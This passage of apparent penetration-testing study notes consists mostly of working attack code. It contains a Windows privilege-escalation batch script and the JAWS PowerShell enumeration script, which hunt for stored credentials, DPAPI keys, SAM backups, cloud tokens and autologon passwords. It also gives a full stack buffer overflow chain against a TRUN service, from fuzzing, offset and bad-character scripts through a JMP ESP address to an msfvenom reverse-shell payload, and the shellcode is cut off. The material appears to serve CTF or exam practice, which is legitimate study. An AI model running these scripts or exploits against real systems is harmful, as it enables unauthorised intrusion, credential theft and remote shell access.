	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
		echo %%~s ^| findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
::wmic service get name,displayname,pathname,startmode | more | findstr /i /v "C:\\Windows\\system32\\" | findstr /i /v """
echo.
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [*] DLL HIJACKING in PATHenv variable ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Maybe you can take advantage of modifying/creating some binary in some of the following locations
echo [i] PATH variable entries permissions - place binary or DLL to execute instead of legitimate
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dll-hijacking
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
echo.
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [*] CREDENTIALS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] WINDOWS VAULT ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#windows-vault
cmdkey /list
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] DPAPI MASTER KEYS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Use the Mimikatz 'dpapi::masterkey' module with appropriate arguments (/rpc) to decrypt
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
powershell -command "Get-ChildItem %appdata%\Microsoft\Protect" 2>nul
powershell -command "Get-ChildItem %localappdata%\Microsoft\Protect" 2>nul
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] DPAPI MASTER KEYS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Use the Mimikatz 'dpapi::cred' module with appropriate /masterkey to decrypt
echo [i] You can also extract many DPAPI masterkeys from memory with the Mimikatz 'sekurlsa::dpapi' module
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
echo Looking inside %appdata%\Microsoft\Credentials\
dir /b/a %appdata%\Microsoft\Credentials\ 2>nul 
echo Looking inside %localappdata%\Microsoft\Credentials\
dir /b/a %localappdata%\Microsoft\Credentials\ 2>nul
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] Unattended files ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
IF EXIST %WINDIR%\sysprep\sysprep.xml ECHO %WINDIR%\sysprep\sysprep.xml exists. 
IF EXIST %WINDIR%\sysprep\sysprep.inf ECHO %WINDIR%\sysprep\sysprep.inf exists. 
IF EXIST %WINDIR%\sysprep.inf ECHO %WINDIR%\sysprep.inf exists. 
IF EXIST %WINDIR%\Panther\Unattended.xml ECHO %WINDIR%\Panther\Unattended.xml exists. 
IF EXIST %WINDIR%\Panther\Unattend.xml ECHO %WINDIR%\Panther\Unattend.xml exists. 
IF EXIST %WINDIR%\Panther\Unattend\Unattend.xml ECHO %WINDIR%\Panther\Unattend\Unattend.xml exists. 
IF EXIST %WINDIR%\Panther\Unattend\Unattended.xml ECHO %WINDIR%\Panther\Unattend\Unattended.xml exists.
IF EXIST %WINDIR%\System32\Sysprep\unattend.xml ECHO %WINDIR%\System32\Sysprep\unattend.xml exists.
IF EXIST %WINDIR%\System32\Sysprep\unattended.xml ECHO %WINDIR%\System32\Sysprep\unattended.xml exists.
IF EXIST %WINDIR%\..\unattend.txt ECHO %WINDIR%\..\unattend.txt exists.
IF EXIST %WINDIR%\..\unattend.inf ECHO %WINDIR%\..\unattend.inf exists. 
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] SAM & SYSTEM backups ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
IF EXIST %WINDIR%\repair\SAM ECHO %WINDIR%\repair\SAM exists. 
IF EXIST %WINDIR%\System32\config\RegBack\SAM ECHO %WINDIR%\System32\config\RegBack\SAM exists.
IF EXIST %WINDIR%\System32\config\SAM ECHO %WINDIR%\System32\config\SAM exists.
IF EXIST %WINDIR%\repair\SYSTEM ECHO %WINDIR%\repair\SYSTEM exists.
IF EXIST %WINDIR%\System32\config\SYSTEM ECHO %WINDIR%\System32\config\SYSTEM exists.
IF EXIST %WINDIR%\System32\config\RegBack\SYSTEM ECHO %WINDIR%\System32\config\RegBack\SYSTEM exists.
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] McAffe SiteList.xml ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
cd %ProgramFiles% 2>nul
dir /s SiteList.xml
cd %ProgramFiles(x86)% 2>nul
dir /s SiteList.xml
cd "%windir%\..\Documents and Settings" 2>nul
dir /s SiteList.xml
cd %windir%\..\Users 2>nul
dir /s SiteList.xml
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] GPP Password ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
cd "%SystemDrive%\Microsoft\Group Policy\history"
dir /s/b Groups.xml == Services.xml == Scheduledtasks.xml == DataSources.xml == Printers.xml == Drives.xml
cd "%windir%\..\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history"
dir /s/b Groups.xml == Services.xml == Scheduledtasks.xml == DataSources.xml == Printers.xml == Drives.xml
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] Cloud Creds ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
cd "%SystemDrive%\Users"
dir /s/b .aws == credentials == gcloud == credentials.db == legacy_credentials == access_tokens.db == .azure == accessTokens.json == azureProfile.json
cd "%windir%\..\Documents and Settings"
dir /s/b .aws == credentials == gcloud == credentials.db == legacy_credentials == access_tokens.db == .azure == accessTokens.json == azureProfile.json
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] AppCmd ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
IF EXIST %systemroot%\system32\inetsrv\appcmd.exe ECHO %systemroot%\system32\inetsrv\appcmd.exe exists. 
echo.
echo.
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] Files an registry that may contain credentials ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Searching specific files that may contains credentials.
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
echo Looking inside HKCU\Software\ORL\WinVNC3\Password
reg query HKCU\Software\ORL\WinVNC3\Password 2>nul
echo Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password 2>nul
echo Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
echo Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s 2>nul
echo Looking inside HKCU\Software\TightVNC\Server
reg query HKCU\Software\TightVNC\Server 2>nul
echo Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s 2>nul
echo Looking inside HKCU\Software\OpenSSH\Agent\Keys
reg query HKCU\Software\OpenSSH\Agent\Keys /s 2>nul
cd %USERPROFILE% 2>nul && dir /s/b *password* == *credential* 2>nul
cd ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..
dir /s/b /A:-D RDCMan.settings == *.rdg == SCClient.exe == *_history == .sudo_as_admin_successful == .profile == *bashrc == httpd.conf == *.plan == .htpasswd == .git-credentials == *.rhosts == hosts.equiv == Dockerfile == docker-compose.yml == appcmd.exe == TypedURLs == TypedURLsTime == History == Bookmarks == Cookies == "Login Data" == places.sqlite == key3.db == key4.db == credentials == credentials.db == access_tokens.db == accessTokens.json == legacy_credentials == azureProfile.json == unattend.txt == access.log == error.log == *.gpg == *.pgp == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12 == *.der == *.csr == *.cer == known_hosts == id_rsa == id_dsa == *.ovpn == anaconda-ks.cfg == hostapd.conf == rsyncd.conf == cesi.conf == supervisord.conf == tomcat-users.xml == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == unattend.xml == unattended.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == groups.xml == services.xml == scheduledtasks.xml == printers.xml == drives.xml == datasources.xml == php.ini == https.conf == https-xampp.conf == httpd.conf == my.ini == my.cnf == access.log == error.log == server.xml == SiteList.xml == ConsoleHost_history.txt == setupinfo == setupinfo.bak 2>nul | findstr /v ".dll"
cd inetpub 2>nul && (dir /s/b web.config == *.log & cd ..)
echo.
echo.
if "%long%" == "yes" (
    echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] REGISTRY WITH STRING pass OR pwd ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
	reg query HKLM /f passw /t REG_SZ /s
	reg query HKCU /f passw /t REG_SZ /s
	reg query HKLM /f pwd /t REG_SZ /s
	reg query HKCU /f pwd /t REG_SZ /s
	echo.
	echo.
	echo [i] Iterating through the drives
	echo.
	for /f %%x in ('wmic logicaldisk get name^| more') do (
		set tdrive=%%x
		if "!tdrive:~1,2!" == ":" (
			%%x
            echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] FILES THAT CONTAINS THE WORD PASSWORD WITH EXTENSION: .xml .ini .txt *.cfg *.config ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
	        findstr /s/n/m/i password *.xml *.ini *.txt *.cfg *.config 2>nul | findstr /v /i "\\AppData\\Local \\WinSxS ApnDatabase.xml \\UEV\\InboxTemplates \\Microsoft.Windows.Cloud \\Notepad\+\+\\ vmware cortana alphabet \\7-zip\\" 2>nul
            echo.
            echo.
            echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] FILES WHOSE NAME CONTAINS THE WORD PASS CRED or .config not inside \Windows\ ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
            dir /s/b *pass* == *cred* == *.config* == *.cfg 2>nul | findstr /v /i "\\windows\\"  
            echo.
            echo.
		)
	)
	echo.
)
```
- jaws.ps1

running within cmd

```
CMD C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
```
running within powershell

```
PS C:\temp> .\jaws-enum.ps1
```

```
<#
.SYNOPSIS
Windows enumeration script
.DESCRIPTION
This script is designed to be used in a penetration test or CTF
enviroment. It will enumerate useful information from the host
for privilege escalation.
.EXAMPLE
PS > .\jaws-enum.ps1 
will write results out to screen.
.EXAMPLE
PS > .\jaws-enum.ps1 -OutputFileName Jaws-Enum.txt
Writes out results to Jaws-Enum.txt in current directory.
.LINK
https://github.com/411Hall/JAWS
#>
Param(
    [String]$OutputFilename = ""
)

function JAWS-ENUM {
    write-output "`nRunning J.A.W.S. Enumeration"
    $output = "" 
    $output = $output +  "############################################################`r`n"
    $output = $output +  "##     J.A.W.S. (Just Another Windows Enum Script)        ##`r`n"
    $output = $output +  "##                                                        ##`r`n"
    $output = $output +  "##           https://github.com/411Hall/JAWS              ##`r`n"
    $output = $output +  "##                                                        ##`r`n"
    $output = $output +  "############################################################`r`n"
    $output = $output +  "`r`n"
    $win_version = (Get-WmiObject -class Win32_OperatingSystem)
    $output = $output +  "Windows Version: " + (($win_version.caption -join $win_version.version) + "`r`n")
    $output = $output +  "Architecture: " + (($env:processor_architecture) + "`r`n")
    $output = $output +  "Hostname: " + (($env:ComputerName) + "`r`n")
    $output = $output +  "Current User: " + (($env:username) + "`r`n")
    $output = $output +  "Current Time\Date: " + (get-date)
    $output = $output +  "`r`n"
    $output = $output +  "`r`n"
    write-output "	- Gathering User Information"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " Users`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
    $adsi.Children | where {$_.SchemaClassName -eq 'user'} | Foreach-Object {
        $groups = $_.Groups() | Foreach-Object {$_.GetType().InvokeMember("Name", 'GetProperty', $null, $_, $null)}
        $output = $output +  "----------`r`n"
        $output = $output +  "Username: " + $_.Name +  "`r`n"
        $output = $output +  "Groups:   "  + $groups +  "`r`n"
    }
    $output = $output +  "`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " Network Information`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output + (ipconfig | out-string)
    $output = $output +  "`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " Arp`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output + (arp -a | out-string) 
    $output = $output +  "`r`n"
    $output = $output +  "`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " NetStat`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output + (netstat -ano | out-string)
    $output = $output +  "`r`n"
    $output = $output +  "`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " Firewall Status`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  "`r`n"
    $Firewall = New-Object -com HNetCfg.FwMgr
    $FireProfile = $Firewall.LocalPolicy.CurrentProfile  
    if ($FireProfile.FirewallEnabled -eq $False) {
        $output = $output +  ("Firewall is Disabled" + "`r`n")
        } else {
        $output = $output +  ("Firwall is Enabled" + "`r`n")
        }
    $output = $output +  "`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " FireWall Rules`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    Function Get-FireWallRule
    {Param ($Name, $Direction, $Enabled, $Protocol, $profile, $action, $grouping)
    $Rules=(New-object -comObject HNetCfg.FwPolicy2).rules
    If ($name)      {$rules= $rules | where-object {$_.name     -like $name}}
    If ($direction) {$rules= $rules | where-object {$_.direction  -eq $direction}}
    If ($Enabled)   {$rules= $rules | where-object {$_.Enabled    -eq $Enabled}}
    If ($protocol)  {$rules= $rules | where-object {$_.protocol   -eq $protocol}}
    If ($profile)   {$rules= $rules | where-object {$_.Profiles -bAND $profile}}
    If ($Action)    {$rules= $rules | where-object {$_.Action     -eq $Action}}
    If ($Grouping)  {$rules= $rules | where-object {$_.Grouping -like $Grouping}}
    $rules}
    $output = $output +  (Get-firewallRule -enabled $true | sort direction,applicationName,name | format-table -property Name , localPorts,applicationname | out-string)
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " Hosts File Content`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  "`r`n"
    $output = $output + ((get-content $env:windir\System32\drivers\etc\hosts | out-string) + "`r`n")
    $output = $output +  "`r`n"
    write-output "	- Gathering Processes, Services and Scheduled Tasks"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " Processes`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  ((Get-WmiObject win32_process | Select-Object Name,ProcessID,@{n='Owner';e={$_.GetOwner().User}},CommandLine | sort name | format-table -wrap -autosize | out-string) + "`r`n")
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " Scheduled Tasks`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  "Current System Time: " + (get-date)
    $output = $output + (schtasks /query /FO CSV /v | convertfrom-csv | where { $_.TaskName -ne "TaskName" } | select "TaskName","Run As User", "Task to Run"  | fl | out-string)
    $output = $output +  "`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " Services`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output + (get-service | Select Name,DisplayName,Status | sort status | Format-Table -Property * -AutoSize | Out-String -Width 4096)
    $output = $output +  "`r`n"
    write-output "	- Gathering Installed Software"
    $output = $output +  "`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " Installed Programs`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  (get-wmiobject -Class win32_product | select Name, Version, Caption | ft -hidetableheaders -autosize| out-string -Width 4096)
    $output = $output +  "`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " Installed Patches`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  (Get-Wmiobject -class Win32_QuickFixEngineering -namespace "root\cimv2" | select HotFixID, InstalledOn| ft -autosize | out-string )
    $output = $output +  "`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " Program Folders`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output + "`n`rC:\Program Files`r`n"
    $output = $output +  "-------------"
    $output = $output + (get-childitem "C:\Program Files"  -EA SilentlyContinue  | select Name  | ft -hidetableheaders -autosize| out-string)
    $output = $output + "C:\Program Files (x86)`r`n"
    $output = $output +  "-------------------"
    $output = $output + (get-childitem "C:\Program Files (x86)"  -EA SilentlyContinue  | select Name  | ft -hidetableheaders -autosize| out-string)
    $output = $output +  "`r`n"
    write-output "	- Gathering File System Information"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " Files with Full Control and Modify Access`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $files = get-childitem C:\
    foreach ($file in $files){
        try {
            $output = $output +  (get-childitem "C:\$file" -include *.ps1,*.bat,*.com,*.vbs,*.txt,*.html,*.conf,*.rdp,.*inf,*.ini -recurse -EA SilentlyContinue | get-acl -EA SilentlyContinue | select path -expand access | 
            where {$_.identityreference -notmatch "BUILTIN|NT AUTHORITY|EVERYONE|CREATOR OWNER|NT SERVICE"} | where {$_.filesystemrights -match "FullControl|Modify"} | 
            ft @{Label="";Expression={Convert-Path $_.Path}}  -hidetableheaders -autosize | out-string -Width 4096)
            }
        catch {
            $output = $output +   "`nFailed to read more files`r`n"
        }
        }

    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " Folders with Full Control and Modify Access`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $folders = get-childitem C:\
    foreach ($folder in $folders){
        try {
            $output = $output +  (Get-ChildItem -Recurse "C:\$folder" -EA SilentlyContinue | ?{ $_.PSIsContainer} | get-acl  | select path -expand access |  
            where {$_.identityreference -notmatch "BUILTIN|NT AUTHORITY|CREATOR OWNER|NT SERVICE"}  | where {$_.filesystemrights -match "FullControl|Modify"} | 
            select path,filesystemrights,IdentityReference |  ft @{Label="";Expression={Convert-Path $_.Path}}  -hidetableheaders -autosize | out-string -Width 4096)
             }
        catch {
            $output = $output +  "`nFailed to read more folders`r`n"
        }
        }
    $output = $output +  "`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " Mapped Drives`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  (Get-WmiObject -Class Win32_LogicalDisk | select DeviceID, VolumeName | ft -hidetableheaders -autosize | out-string -Width 4096)
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " Unquoted Service Paths`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  (cmd /c  'wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """')
    $output = $output +  "`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " Recent Documents`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  (get-childitem "C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Recent"  -EA SilentlyContinue | select Name | ft -hidetableheaders | out-string )
    $output = $output +  "`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " Potentially Interesting Files in Users Directory `r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  (get-childitem "C:\Users\" -recurse -Include *.zip,*.rar,*.7z,*.gz,*.conf,*.rdp,*.kdbx,*.crt,*.pem,*.ppk,*.txt,*.xml,*.vnc.*.ini,*.vbs,*.bat,*.ps1,*.cmd -EA SilentlyContinue | %{$_.FullName } | out-string)
    $output = $output +  "`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " 10 Last Modified Files in C:\User`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output + (Get-ChildItem 'C:\Users' -recurse -EA SilentlyContinue | Sort {$_.LastWriteTime} |  %{$_.FullName } | select -last 10 | ft -hidetableheaders | out-string)
    $output = $output +  "`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " MUICache Files`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    get-childitem "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\" -EA SilentlyContinue |
    foreach { $CurrentKey = (Get-ItemProperty -Path $_.PsPath)
       if ($CurrentKey -match "C:\\") {
          $output = $output + ($_.Property -join "`r`n")
       }
    }
    $output = $output +  "`r`n"
    $output = $output +  "`r`n"
    write-output "	- Looking for Simple Priv Esc Methods"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " System Files with Passwords`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $files = ("unattended.xml", "sysprep.xml", "autounattended.xml","unattended.inf", "sysprep.inf", "autounattended.inf","unattended.txt", "sysprep.txt", "autounattended.txt")
    $output = $output +  (get-childitem C:\ -recurse -include $files -EA SilentlyContinue  | Select-String -pattern "<Value>" | out-string)
    $output = $output +  "`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " AlwaysInstalledElevated Registry Key`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $HKLM = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer"
    $HKCU =  "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer"
    if (($HKLM | test-path) -eq "True") 
    {
        if (((Get-ItemProperty -Path $HKLM -Name AlwaysInstallElevated).AlwaysInstallElevated) -eq 1)
        {
            $output = $output +   "AlwaysInstallElevated enabled on this host!"
        }
    }
    if (($HKCU | test-path) -eq "True") 
    {
        if (((Get-ItemProperty -Path $HKCU -Name AlwaysInstallElevated).AlwaysInstallElevated) -eq 1)
        {
            $output = $output +   "AlwaysInstallElevated enabled on this host!"
        }
    }
    $output = $output +  "`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " Stored Credentials`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output + (cmdkey /list | out-string)
    $output = $output +  "`r`n"
    $output = $output +  "-----------------------------------------------------------`r`n"
    $output = $output +  " Checking for AutoAdminLogon `r`n"
    $output = $output + "-----------------------------------------------------------`r`n"
    $Winlogon = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    if (get-itemproperty -path $Winlogon -Name AutoAdminLogon -ErrorAction SilentlyContinue) 
        {
        if ((get-itemproperty -path $Winlogon -Name AutoAdminLogon).AutoAdminLogon -eq 1) 
            {
            $Username = (get-itemproperty -path $Winlogon -Name DefaultUserName).DefaultUsername
            $output = $output + "The default username is $Username `r`n"
            $Password = (get-itemproperty -path $Winlogon -Name DefaultPassword).DefaultPassword
            $output = $output + "The default password is $Password `r`n"
            $DefaultDomainName = (get-itemproperty -path $Winlogon -Name DefaultDomainName).DefaultDomainName
            $output = $output + "The default domainname is $DefaultDomainName `r`n"
            }
        }
    $output = $output +  "`r`n"
    if ($OutputFilename.length -gt 0)
       {
        $output | Out-File -FilePath $OutputFileName -encoding utf8
        }
    else
        {
        clear-host
        write-output $output
        }
}

if ($OutputFilename.length -gt 0)
    {
        Try 
            { 
                [io.file]::OpenWrite($OutputFilename).close()  
                JAWS-ENUM
            }
        Catch 
            { 
                Write-Warning "`nUnable to write to output file $OutputFilename, Check path and permissions" 
            }
    } 
else 
    {
    JAWS-ENUM
    }
```
## stack buffer overflow without aslr/dep/seh

- fuzzing
- finding the offset
- overwriting the eip
- finding bad characters
- finding the right module
- generating shellcode -> root

### fuzz.py

```
#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A"*100

while True:
        try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('<IP>',<port>))
                
                s.send(('TRUN /.:/'+buffer)) #trun command
                s.close()
                sleep(1)
                buffer=buffer+"A"*100
                
        except:
                print "Fuzzing crashed at %s bytes" % str(len(buffer))
                sys.exit()
```

### offset.py

- /usr/share/metasploit-framework/tools/exploit/pattern-create.rb -l 5000
```
#!/usr/bin/python
import sys, socket
from time import sleep

offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af>


try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.1.110',9999))

                s.send(('TRUN /.:/'+ offset)) 
                s.close()


except:
                print "Error Connecting to server"
                sys.exit()
```

### overwrite.py

```
#!/usr/bin/python
import sys, socket
from time import sleep

shellcode = "A"*2003 + "B"*4


try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.1.110',9999))
                
                s.send(('TRUN /.:/'+ shellcode)) #trun command
                s.close()

                
except:
                print "Error connecting to server"
                sys.exit()
```

### badchars.py

```
#!/usr/bin/python
import sys, socket
from time import sleep

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = "A"*2003 + "B"*4 +badchars


try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.1.110',9999))
                
                s.send(('TRUN /.:/'+ shellcode)) #trun command
                s.close()

                
except:
                print "Error connecting to server"
                sys.exit()
```
### module.py

- use !mona jmp -r esp to find the hex value to overwrite on the EIP
- !mona modules to select the right module without memory protections
- view modules -> find command JMP ESP (FFE4)
- little endian rules

```
#!/usr/bin/python
import sys, socket
from time import sleep

shellcode = "A"*2003 + "\xaf\x11\x50\x62" #this could be different (little endian)


try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('192.168.1.110',9999))
                
                s.send(('TRUN /.:/'+ shellcode)) #trun command
                s.close()

                
except:
                print "Error connecting to server"
                sys.exit()
```

### shellcode.py

- generate shellcode with

```
msfvenom -p windows/shell_reverse_tcp -lhost=yourip -lport=yourport -f c -a x86 EXITFUNC=thread -b "\x00(badchars)"
```
```
  GNU nano 4.9.3     shellcode.py                
#!/usr/bin/python
import sys, socket
from time import sleep

overflow = ("\xda\xcf\xd9\x74\x24\xf4\xba\xcb\xe>
"\x52\x83\xe8\xfc\x31\x50\x13\x03\x9b\xf1\x14\x6>
"\x92\x17\xdf\x3b\x1a\xf2\xee\x7b\x78\x77\x40\x4>
